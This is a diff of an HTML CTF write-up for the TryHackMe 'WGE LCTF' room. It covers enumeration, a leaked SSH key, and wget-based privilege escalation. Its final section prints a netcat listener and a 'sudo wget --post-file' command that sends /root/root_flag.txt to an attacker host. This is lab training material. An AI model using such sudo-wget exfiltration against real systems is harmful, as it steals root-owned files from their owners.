@@ -52,13 +52,13 @@
 </head>
 <body>
 
-  <h1>🚩 TryHackMe - WGE LCTF Writeup</h1>
+  <h1>🚩 TryHackMe – WGE LCTF Writeup</h1>
   <p><strong>Room:</strong> <a href="https://tryhackme.com/room/wgelctf" target="_blank">WGE LCTF</a></p>
 
   <div class="section">
     <h2>🔎 Initial Recon</h2>
-    <p>We begin with an Nmap scan on the target IP <code>10.10.141.118</code>:</p>
-    <img src="assets/img/wgel/scan.png" alt="Nmap full scan result">
+    <p>Nmap scan on <code>10.10.141.118</code>:</p>
+    <img src="assets/img/wgel/scan.png" alt="Nmap scan">
     <ul>
       <li>22/tcp – SSH</li>
       <li>80/tcp – HTTP (Apache 2.4.18)</li>
@@ -67,84 +67,81 @@
 
   <div class="section">
     <h2>🌐 Apache Default Page</h2>
-    <p>Accessing port 80 shows the Apache2 Ubuntu default page:</p>
-    <img src="assets/img/wgel/apache-server.png" alt="Apache2 default page">
+    <p>Port 80 shows Apache default page:</p>
+    <img src="assets/img/wgel/apache-server.png" alt="Apache default">
   </div>
 
   <div class="section">
     <h2>📂 Hidden Page Discovered</h2>
-    <p>Exploring <code>/sitemap/</code> manually, we find a deployed Unapp template:</p>
-    <img src="assets/img/wgel/sitemap-found.png" alt="Unapp template in /sitemap/">
+    <p>Manually navigating to <code>/sitemap/</code> shows an Unapp landing page:</p>
+    <img src="assets/img/wgel/sitemap-found.png" alt="Unapp template">
   </div>
 
   <div class="section">
     <h2>🛠️ Gobuster Enumeration</h2>
-    <p>Using Gobuster with a common wordlist reveals a directory containing SSH keys:</p>
-    <img src="assets/img/wgel/gobuster-found.png" alt="Gobuster finds .ssh folder">
+    <p>Running Gobuster on the root path reveals a suspicious <code>.ssh</code> folder:</p>
+    <img src="assets/img/wgel/gobuster-found.png" alt="Gobuster finds .ssh">
+
+    <p>Running Gobuster directly on <code>/sitemap/</code> shows even more structure, including the same <code>.ssh</code> folder, proving the leak is inside that path:</p>
+    <img src="assets/img/wgel/sitemap-gobuster.png" alt="Gobuster on /sitemap">
   </div>
 
   <div class="section">
     <h2>👀 Developer Comment</h2>
-    <p>In the page source code, we spot a helpful comment:</p>
-    <img src="assets/img/wgel/source-code.png" alt="Comment left in HTML source">
+    <p>Viewing the HTML source of the landing page, we find a dev note:</p>
+    <img src="assets/img/wgel/source-code.png" alt="Dev comment">
     <blockquote><em>"Jessie don't forget to update the website"</em></blockquote>
   </div>
 
   <div class="section">
     <h2>🔑 SSH Key Disclosure</h2>
-    <p>In <code>/sitemap/.ssh/</code>, we find a private SSH key:</p>
-    <img src="assets/img/wgel/ssh-found.png" alt="Private SSH key found in .ssh">
+    <p>Inside <code>/sitemap/.ssh/</code>, a private key is fully exposed:</p>
+    <img src="assets/img/wgel/ssh-found.png" alt="Private key found">
   </div>
 
   <div class="section">
     <h2>🔐 SSH Access Gained</h2>
-    <p>We log in as user <code>jessie</code> using the downloaded key:</p>
-    <img src="assets/img/wgel/ssh-login.png" alt="Logged in via SSH as jessie">
+    <p>We use the key to login as <code>jessie</code>:</p>
+    <img src="assets/img/wgel/ssh-login.png" alt="SSH login successful">
   </div>
 
   <div class="section">
     <h2>🔍 Sudo Privileges Review</h2>
-    <p>Using <code>sudo -l</code>, we see <code>wget</code> can be run as root without password:</p>
-    <img src="assets/img/wgel/sudo-l.png" alt="Sudo privilege shown for wget">
+    <p><code>wget</code> is allowed via <code>sudo</code> with no password:</p>
+    <img src="assets/img/wgel/sudo-l.png" alt="Sudo privileges">
   </div>
 
   <div class="section">
     <h2>📜 user_flag.txt Captured</h2>
-    <p>We locate the first flag using <code>find</code>:</p>
-    <img src="assets/img/wgel/userflag.txt.png" alt="User flag located">
+    <p>We find <code>user_flag.txt</code> using <code>find / -name user_flag.txt</code>:</p>
+    <img src="assets/img/wgel/userflag.txt.png" alt="User flag">
   </div>
 
   <div class="section">
     <h2>⚡ Manual PrivEsc via wget --post-file</h2>
-    <p>GTFOBins lists <code>wget</code> as a potential sudo binary for privilege escalation, but the reverse shell method there <strong>did not work</strong> in this environment.</p>
-
-    <p>Instead, I crafted a manual approach using the <code>--post-file</code> option in wget. This allows uploading a file to a listening HTTP server via POST. Since wget is run with <code>sudo</code>, I can send <code>/root/root_flag.txt</code> to my attack box.</p>
-
-    <img src="assets/img/wgel/wget-vuln.png" alt="Crafting wget post-file command manually">
-
-    <p><strong>Steps:</strong></p>
-    <pre><code># On attacker (listening on port 80):
+    <p>GTFOBins lists <code>wget</code> for privilege escalation, but the reverse shell technique didn’t work on this machine.</p>
+    <p>Instead, we use <code>--post-file</code> to send <code>/root/root_flag.txt</code> to our own HTTP listener:</p>
+    <img src="assets/img/wgel/wget-vuln.png" alt="wget --post-file trick">
+    <pre><code># Attacker:
 nc -lvnp 80
 
-# On victim:
+# Victim:
 sudo /usr/bin/wget --post-file=/root/root_flag.txt http://YOUR-IP</code></pre>
-
-    <p>The listener receives the root flag directly over HTTP POST.</p>
+    <p>The flag is delivered via POST!</p>
   </div>
 
   <div class="section">
     <h2>🏁 root_flag.txt Captured</h2>
-    <p>The netcat listener catches the flag sent via <code>wget</code>:</p>
-    <img src="assets/img/wgel/rootflag.png" alt="Root flag received via POST">
+    <p>We capture the root flag on our listener:</p>
+    <img src="assets/img/wgel/rootflag.png" alt="Root flag received">
   </div>
 
   <div class="section">
     <h2>✅ Summary</h2>
     <ul>
-      <li>Web server leaked private SSH key → SSH access as <code>jessie</code></li>
-      <li>Jessie had sudo privileges on <code>wget</code></li>
-      <li>Manually crafted a POST request to exfiltrate <code>root_flag.txt</code></li>
-      <li><strong>Flags captured:</strong> <code>user_flag.txt ✅</code> & <code>root_flag.txt ✅</code></li>
+      <li>🔓 SSH key leaked → Access as <code>jessie</code></li>
+      <li>🔧 Sudo allowed <code>wget</code> → Exploited manually</li>
+      <li>🚩 Captured <code>user_flag.txt</code> and <code>root_flag.txt</code></li>
     </ul>
   </div>
 
